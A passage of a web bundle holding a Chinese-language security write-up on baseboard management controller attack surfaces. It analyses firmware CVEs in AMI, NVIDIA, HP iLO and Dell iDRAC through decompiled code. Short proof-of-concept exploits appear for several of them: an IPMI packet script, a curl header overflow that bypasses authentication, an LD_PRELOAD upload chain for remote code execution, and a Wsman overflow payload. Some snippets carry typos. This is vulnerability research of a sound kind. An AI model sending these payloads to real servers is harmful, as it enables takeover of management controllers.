13;\n")),(0,r.kt)("p",null,"\u540c\u7406\uff0c\u6ca1\u6709\u5bf9\u5730\u5740\u548c\u5185\u5bb9\u505a\u6821\u9a8c\uff0c\u4f1a\u5c06\u8bf7\u6c42\u5305\u5185\u5bb9\u5199\u5165\u4efb\u610f\u5730\u5740\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},"if ( gDeviceNode <= 1 )\n{\n    if ( ActivateFlashStatus == 1 )\n        if (CalculateChksum(&req->address, LOBYTE(req->hdr.struct_length) | (HIBYTE(req->hdr.struct_length) << 8)) == (LOBYTE(...)))\n        {\n            memcpy(\n            (LOBYTE(req->address)| (BYTE1(req->address) << 8) | (BYTE2(req->address) << 16) | (HIBYTE(req->address) << 24)),\n            &req[1],\n            (LOBYTE(req->hdr.struct_length) | (HIBYTE(req->hdr.struct_length) << 8)) - 5);   // [1] Write\n   ...\n")),(0,r.kt)("h4",{id:"\u6848\u4f8b\u56dbcve-2023-34343---ami--cve-2022-42289---nvidia"},"\u6848\u4f8b\u56db\uff1aCVE-2023-34343 - AMI & CVE-2022-42289 - NVIDIA"),(0,r.kt)("p",null,"SNMP Injection"),(0,r.kt)("p",null,"IPMI\u6bcf\u6b21\u53d1\u9001\u60f3\u8981\u91cd\u65b0\u52a0\u8f7d\u6216\u66f4\u6539SNMP\u914d\u7f6e\u65b0\u5305\u65f6\uff0c\u90fd\u4f1a\u4f7f\u7528system\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\uff0c\u800c","[","1","]","rocommunity\u662f\u4ece\u7528\u6237\u8bf7\u6c42\u4e2d\u8bfb\u53d6\u7684\uff0c\u7136\u540e","[","2","]","\u76f4\u63a5\u88ab\u62fc\u63a5\u5230command\u5e76system\u6267\u884c\uff0c\u5b9e\u73b0\u6ce8\u5165\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},"case 4:         // req[0]\n    *rwcommunity = *zeroes;\n    *&rwcommunity[4] = *&zeroes[4];\n    *&rwcommunity[8] = *&zeroes[8];\n    *&rwcommunity[12] = *&zeroes[12]; \n    req_len_decr = req_len - 1;\n    *&rwcommunity[16] = *&zeroes[16];\n    rwcommunity[20] = zeroes[20];\n    memcpy(aPublic, req + 1, req_len_decr);\n    memcpy(rocommunity, req + 1, req_len_decr);    // [1]\n    break;\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},'memset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo\'#SNMP User Configuration\' > %s", "/conf/snmp_users.conf");\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo \'rwcommunity %s\' >>%s"\uff0c rwcommunity, "/conf/snmp_users.conf");\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo \'rocommunity %s\' >>%s", rocommunity, "/conf/snmp_users.conf");    // [2]\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo \'rwcommunity6 %s\' >>%s", rwcommunity, "/conf/snmp_users.conf");\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo \'rocommunity6 %s\' >>%s " , rocommunity, "/conf/snmp_users.conf");   // [2]\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo \'dlmod libsnmp_hostname_mib /usr/1ocal/lib/libsnmp_hostname_mib.so\' >>%s"\uff0c "/conf/snmp_users.conf");\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, "echo \'dlmod libsnmp_systemstatus /usr/local/lib/libsnmp_systemstatus.so\' >>%s"\uff0c"/conf/snmp_users.conf");\nsystem(cmd);\nmemset(cmd, 0, sizeof(cmd));\nsprintf(cmd, " echo \'dlmod libsnmp_CHANGEME_mib /usr/local/lib/libsnmp_CHANGEME_mib.so\' >>%s"\uff0c "/conf/snmp_users.conf");\nsystem(cmd);\n')),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e94cve-2023-34334---ami--cve-2022-42290---nvidia"},"\u6848\u4f8b\u4e94\uff1aCVE-2023-34334 - AMI & CVE-2022-42290 - NVIDIA"),(0,r.kt)("p",null,"NTP Injection"),(0,r.kt)("p",null," ",(0,r.kt)("img",{src:t(9296).Z,width:"604",height:"118"})),(0,r.kt)("p",null,"\u7528\u6237\u5f00\u542fNTP\u670d\u52a1\u540e\uff0c\u53ef\u4ee5","[","1","]","\u8bbe\u7f6e\u4e3b\u670d\u52a1\u5668\u5730\u5740\u5e76","[","2","]","\u5c06\u5176\u4fdd\u5b58\u5230",(0,r.kt)("inlineCode",{parentName:"p"},"g_BMCInfo"),"\u53d8\u91cf\u4e2d\u91cd\u542fntp\u670d\u52a1\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-clike"},'    subcmd = *req;\n    switch (*req)\n    {\n        case 1:            // subcmd 1: set primary server\n        case 2:             // subcmd 2: set secondary server\n            if(req_len != 129)\n                goto LABEL_7;\n            if (g_BMCInfo[instance].ntp_enabled == 1 )  // ntp_enabled\n            {\n                first_servername_byte = req[1];\n                if ( first_servername_byte )\n                {\n                    if(subcmd == 1)\n                    {\n                        if ( snprintf(g_BMCInfo[instance].ntp_primary, 0x80u, "%s"\uff0creq + 1) <= 0x7F )    // [1]\n                            goto success;\n                        IDBG_LINUXAPP_Dbg0ut(130\uff0c"[%s :%d]Buffer 0verflow", "NTPCmds.c", 222);\n                        *res = 0xF1;\n                    }\n                }\n                else\n                {\n                    if ( snprintf(g_BMCInfo[ instance].ntp_secondary, 0x80u, "%s", req + 1) <= 0x7F )\n                    ...\n        ...\n        case 4:            // subcmd 4: save config and restart ntp\n            if(req_len!=1)\n            goto LABEL 7;\n            if ( g_ BMCInfo[instance].ntp_enabled == 1 ) // ntp_enabled\n            {\n                if ( g_BMCInfo[instance].ntp_primary[0] && libami_setntpServer(1, g_BMCInfo[instance].ntp_primary)) // [2]\n                {\n                    v18 = dlerror();\n                    IDBG_LINUXAPP_Dbg0ut(\n                        130,\n                        \u201d[%s :%d]Error in loading symbol libami_ setntpServer %s\\n" ,\n                        "NTPCmds.C",\n                        296\uff0c\n                        v18);\n                        *res = -14;\n                    return 1;\n                }    \n                if ( l1bami_setntpServer(2, g_BMCInfo[instance].ntp_secondary))\n                ...\n')),(0,r.kt)("p",null,"\u91cd\u65b0\u52a0\u8f7dntp\u670d\u52a1\u65f6\u4f1a","[","3","]","\u83b7\u53d6\u4e3b\u670d\u52a1\u5668\u5730\u5740\uff0c\u83b7\u53d6\u6210\u529f\u540e","[","4","]","\u5c06\u4e3b\u670d\u52a1\u5668\u5730\u5740Primary\u4e0d\u5904\u7406\u76f4\u63a5\u62fc\u63a5\u5230ntpdate\u547d\u4ee4\u4e2d\u5b9e\u73b0\u6ce8\u5165","[","5","]","\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},'libntpconf = dlopen("/usr/local/lib/libntpconf.so", 2);\nif( libntpconf) {\n    libami_getntpServer = dlsym(libntpconf, "libami_getntpServer");\n    if ( 1ibami_getntpServer && libami_getntpServer(Primary, Secondary, 128))   // [3]\n    {\n        IDBG_LINUXAPP_DbgOut(130, "[%s:%d]\\n Error in getting primary and secondary ntp server\\n", "PendTask.c", 4073);\n        goto LABEL_7;\n    }\n    if ( snprintf(ntpdate_cmd, 0x100u, "ntpdate -b -s -u %s", Primary) == -1)   // [4]\n    {\n     IDBG_LINUXAPP_DbgOut(130, "[%s:%d]\\n PrimServer Data is invalid.\\n", "PendTask.c", 4078); \n    }\n    else\n    {\n        rc = like_system(ntpdate_cmd);             // [5]\n        if( !rc )\n         goto LABEL_6;\n        IDBG_LINUXAPP_DbgOut( \n         130,\n         "[%s:%d]\\n NTP update failure in primary server: :%d\\n", \n         "PendTask.c",\n         &elf_hash_bucket[958], \n         rc);\n  ...\n')),(0,r.kt)("h4",{id:"\u6848\u4f8b\u516dcve-2017-8979"},"\u6848\u4f8b\u516d\uff1aCVE-2017-8979"),(0,r.kt)("p",null,"IPMI Zero Length Pool Overflow - HP iLO2 < 2.32"),(0,r.kt)("p",null,"HP iLO\u5728\u5bf9IPMI\u6d88\u606f\u957f\u5ea6\u5904\u7406\u65f6\uff0c\u76f4\u63a5\u505a-6\u64cd\u4f5c\uff0c\u5bb9\u6613\u5bfc\u81f4length\u6574\u6570\u4e0b\u6ea2\uff0c\u5e76\u5c06source\u62f7\u8d1d\u5230\u56fa\u5b9a\u5927\u5c0f\u7684mem\u4e2d\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},"length = IPMI_Packet->Message_Length \u2013 6;\nmem = pool_block_allocate()\nmemcpy(mem, source, length);\n")),(0,r.kt)("p",null,"exploit"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'buf = "0600ff07000000000000000000092018c88100388e0465"\nmess= [int(buf[a:a+2], 16) for a in range(0,len(buf), 2)]\np = 13\nnm = mess[:p] + [0] + mess[p+1:]\ns = SendPacket(nm, sys.argv[1], IPMI_PORT)\n')),(0,r.kt)("h3",{id:"\u56dbhttps"},"\uff08\u56db\uff09HTTPS"),(0,r.kt)("p",null,"HTTPS\u534f\u8bae\u5728\u5927\u90e8\u5206BMC\u4e0a\u9ed8\u8ba4\u5f00\u542f\uff0cBMC\u57fa\u672c\u9009\u62e9\u4f7f\u7528\u6d41\u884c\u7684\u5d4c\u5165\u5f0fweb\u670d\u52a1\u3002"),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e00cve-2017-12542"},"\u6848\u4f8b\u4e00\uff1aCVE-2017-12542"),(0,r.kt)("p",null,"Overflow - HP ILO 4 <2.53"),(0,r.kt)("p",null,"\u8fd9\u662f\u4e00\u4e2a\u7531sscanf\u5bfc\u81f4\u7684\u6ea2\u51fa\uff0cilo\u83b7\u53d6\u7528\u6237http\u8bf7\u6c42\u5934\u4e2d\u7684Connection\uff0c\u5e76\u62f7\u8d1d\u5230http_header\u4e2d\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},' if ( *global_struct_a2 )\n  {\n    if ( custom_strncasecmp((int)https_connection, http_header, "Authorization:", 14) )\n    {\n     if ( custom_strncasecmp((int)https_connection, http_header, "Content-length:", 15) )\n     {\n     if ( custom_strncasecmp((int)https_connection, http_header, "Cookie:", 7) )\n    {\n    if ( !custom_strncasecmp((int)https_connection, http_header, "Connection:", 11) )\n     sscanf(http_header, "%*s %s", https_connection->connection);     // 1\n   }\n    else\n  {\n  cookie_header = (int *)get_cookie_header((int)global_struct_a2);\n  parse_req_cookie((int)https_connection, (int)http_header, cookie_header);\n  }\n  }\n')),(0,r.kt)("p",null,"http_header\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e9b\u5b57\u6bb5\uff0c\u5728connection\u4e0b0x1c\u504f\u79fb\u540e\u5c31\u662f\u68c0\u67e5\u662f\u5426\u672c\u5730\u767b\u5f55\u7684\u5b57\u6bb5",(0,r.kt)("inlineCode",{parentName:"p"},"localconnection"),"\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-c"},"struct https_connection {\n ...\n 0x0C: char connection[0x10];\n ...\n 0x28: char localConnection;\n ...\n 0xB8: void *vtable;\n}\n")),(0,r.kt)("p",null,"exploit"),(0,r.kt)("p",null,"\u8986\u76d6localConnection\uff1a\u8ba4\u8bc1\u7ed5\u8fc7"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sh"},'curl -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" [TARGET]\n')),(0,r.kt)("p",null,"\u8986\u76d6\u865a\u8868\u6307\u9488\uff1a\u4efb\u610f\u4ee3\u7801\u6267\u884c"),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e8ccve-2018-1207"},"\u6848\u4f8b\u4e8c\uff1aCVE-2018-1207"),(0,r.kt)("p",null,"Environment Variable Injection leads to RCE - iDRAC 8"),(0,r.kt)("p",null,"\u8be5\u6f0f\u6d1e\u662fiDRAC\u4e0a\u5bf9\u73af\u5883\u53d8\u91cf\u5904\u7406\u4e0d\u5f53\u5bfc\u81f4\u7684RCE\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ cur1 'https://x.x.x.x/cgi-bin/login?LD_DEBUG=files'\nHTTP/1.1 503 Service Unavailable\nKeep-Alive: timeout=60, max=199\n[...]\n24986: file=/usr/lib/libfipsint.so.0.0.0 [0] ;  needed by /usr/1ocal/cgi-bin/ login [O]\n24986: file=/usr/lib/libfipsint.so.0.0.0 [0] ;  generating link map\n24986: dynamic : 0x295689e8  base: 0x29558000  size: 0x00010b24\n24986: entry: 0x29558680  phdr: 0x29558034   phnum : 4\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/cgi-bin/discover?LD_PRELOAD=xxx")," \u5141\u8bb8\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf"),(0,r.kt)("p",null,"\u5e38\u89c1\u601d\u8def\uff1a \u5c06LD_PRELOAD\u6307\u5411\u6807\u51c6\u8f93\u5165\u6587\u4ef6",(0,r.kt)("inlineCode",{parentName:"p"},"/proc/self/fd/0"),"  "),(0,r.kt)("p",null,"\u4f46\u5b9e\u9645\u4e0d\u53ef\u7528\uff0c\u53ef\u80fd\u7684\u539f\u56e0\u6709\u4e8c\uff1a"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"\u4e0d\u5141\u8bb8\u5c06\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u5e38\u6587\u4ef6\uff1b"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"\u5728\u6267\u884c\u5230CGI\u8fd9\u91cc\u7684\u65f6\u5019\uff0c\u88ab\u6253\u5f00\u7684\u4e34\u65f6\u6587\u4ef6\u63cf\u8ff0\u7b26\u5176\u5b9e\u5df2\u7ecf\u88ab\u5173\u95ed\u4e86"),"\uff0cp\u725b\u7684\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u63a7\u5236content-length\u548c\u6587\u4ef6\u5927\u5c0f\u8ba9\u4e0a\u4f20\u6d41\u7a0b\u4e00\u76f4\u4e0d\u7ed3\u675f\uff0c\u4ece\u800c\u4fdd\u6301\u6587\u4ef6\u63cf\u8ff0\u7b26\u6253\u5f00\u72b6\u6001\u3002")),(0,r.kt)("p",null,"\u4e0d\u8fc7 ",(0,r.kt)("inlineCode",{parentName:"p"},"/cgi-bin/putfile")," CGI\u5141\u8bb8\u672a\u6388\u6743\u7528\u6237\u5728\u6587\u4ef6",(0,r.kt)("inlineCode",{parentName:"p"},"/tmp/sshpkauthupload.tmp"),"\u4e2d\u5b58\u50a8\u4efb\u610f\u5185\u5bb9\uff0c\u9650128KB\u3002"),(0,r.kt)("p",null,"exploit"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"POST /cgi-bin/putfile     \u4e0a\u4f20\u4efb\u610f\u6587\u4ef6\u5185\u5bb9"),(0,r.kt)("li",{parentName:"ol"},"POST /cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp     \u4f5c\u4e3a\u73af\u5883\u53d8\u91cf\u52a0\u8f7d")),(0,r.kt)("h4",{id:"\u6848\u4f8b\u4e09cve-2017-8979"},"\u6848\u4f8b\u4e09\uff1aCVE-2017-8979"),(0,r.kt)("p",null,"Preauth Stack-Based Buffer Overflow in ",(0,r.kt)("strong",{parentName:"p"},"Wsman")," XML Tag Name Parsing / ",(0,r.kt)("strong",{parentName:"p"},"Wsman")," XMLns - HP iLO2"),(0,r.kt)("p",null,"iLO\u5728\u5bf9Wsman XML\u8bf7\u6c42\u5904\u7406\u65f6\uff0c\u8c03\u7528sscanf \u5c06xml\u4e2d",(0,r.kt)("strong",{parentName:"p"},":"),"\u540e\u7684\u5b57\u7b26\u4e32\u62f7\u8d1d\u5230\u6808\u4e0a\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-assembly"},'ROM:001108B4 movhi   0x1F\uff0crO\uff0c r7\nROM:001108B8 movea  0xAEO, r7, r7\n   // "%[^:]:%s"\nROM:001108BC addi   0x8O, sp, r8\nROM:001108C0 addi   0xCO, sp, r9\nROM:001108C4 jarl   sscanf, lp\n   // sscanf(arg2\uff0c"%[^:]:%s", sp[0x80], sp[OxCO])\nROM:001108C8 CMP  2, r10\nROM:001108CA bz   loc_1108E\n')),(0,r.kt)("p",null,"exploit"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-py"},"import requests\nheaders = {'Content-Type' : ' application/soap+xml;charset=UTF-8'}\npayload = \"<x:\" + \"B\"*0x300 + \">\\n</x>\"\nr= requests.post('https://x.x.x.x/wsman', data=payload, verify=False, headers=headers)\nprint r.text\n")),(0,r.kt)("h2",{id:"\u4e94\u603b\u7ed3"},"\u4e94\u3001\u603b\u7ed3"),(0,r.kt)("p",null,"\u672c\u6587\u4e3b\u8981\u5206\u4eab\u4e86BMC\u5e38\u89c1\u7684\u653b\u51fb\u9762\u53ca\u76f8\u5173\u5b9e\u4f8b\uff0c\u4ece\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u6f0f\u6d1e\u6210\u56e0\u662f\u5e38\u89c1\u7684\u903b\u8f91\u5904\u7406\u95ee\u9898\u3002\u56e0\u6b64\u5728\u5bf9BMC\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u91cd\u70b9\u5ba1\u8ba1SMASH\u3001SNMP\u3001IPMI\u3001HTTPS\u76f8\u5173\u5904\u7406\u4ee3\u7801\u3002"))}d.isMDXComponent=!0},9296:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/2e592c04-af93-4bcf-90c5-288c45e9f6f7-e31aca9ef0e8b30bc53efb97e5c27946.png"},1972:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/577de501-603e-40a5-97b9-72c834337f38-4bedeb590e1c001c5132eca01563bb14.png"},4595:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/5f2b11f8-71cc-445a-aa18-8a8b9cd912a0-1ae920668d102cb768bb86bb37c162d2.png"},5583:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/956275a1-8eeb-4d0d-a63e-df34c74f2bcc-ddbe1725ef1470f948f8d46bac77146b.png"},9975:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/ca32c80e-85d0-4bb3-b28f-8714debf66c4-3f446b3fc2a3b30204ca8f0bf9f2bb34.png"},5166:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/efb0ea65-2f96-4764-b88d-2d535cbb2999-435b6b6778f9b904357f3bf0695eeff2.png"},4815:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/fcad1051-f110-4407-b863-8ed424605feb-ff4a0a2aeca392568bc673fd0f293f56.png"}}]);